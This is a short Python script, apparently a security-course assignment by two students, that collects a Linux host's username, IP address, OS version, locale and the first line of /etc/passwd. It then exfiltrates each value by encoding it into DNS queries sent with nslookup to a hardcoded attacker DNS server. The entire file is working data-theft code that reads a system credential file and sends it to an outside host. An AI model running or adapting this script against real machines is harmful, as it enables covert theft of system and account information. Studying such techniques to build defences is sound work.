# Aliza Lazar – 336392899
# Raz Cohen – 208008995
import os
import platform
import subprocess

# Hardcoded IP of the attacker's DNS server
ATTACKER_DNS_IP = "10.0.0.1"
DNS_ZONE = "x"  # The custom zone defined on the attacker's BIND server

def get_username():
    return os.getenv("USER") or subprocess.getoutput("whoami")

def get_ip():
    return subprocess.getoutput("hostname -I").strip().split()[0]

def get_os_version():
    return platform.platform()

def get_languages():
    return os.getenv("LANG", "unknown")

def read_password_file():
    try:
        with open("/etc/passwd", "r") as f:
            return f.read()
    except Exception as e:
        return f"error_reading_passwd:{e}"

def send_via_dns(label):
    # Replace forbidden characters and limit label size
    sanitized = label.replace(" ", "_").replace("/", "_").replace(":", "_")[:50]
    full_domain = f"{sanitized}.{ATTACKER_DNS_IP}.{DNS_ZONE}"
    cmd = f"nslookup {full_domain} {ATTACKER_DNS_IP}"
    os.system(cmd)

def exfiltrate():
    print("[*] Collecting system info...")

    data = {
        "user": get_username(),
        "ip": get_ip(),
        "os": get_os_version(),
        "lang": get_languages(),
        "passwd": read_password_file().splitlines()[0][:50]  # First line only, limited length
    }

    print("[*] Sending data via DNS...")
    for key, val in data.items():
        dns_label = f"{key}-{val}"
        send_via_dns(dns_label)

    print("[*] Exfiltration complete.")

if __name__ == "__main__":
    exfiltrate()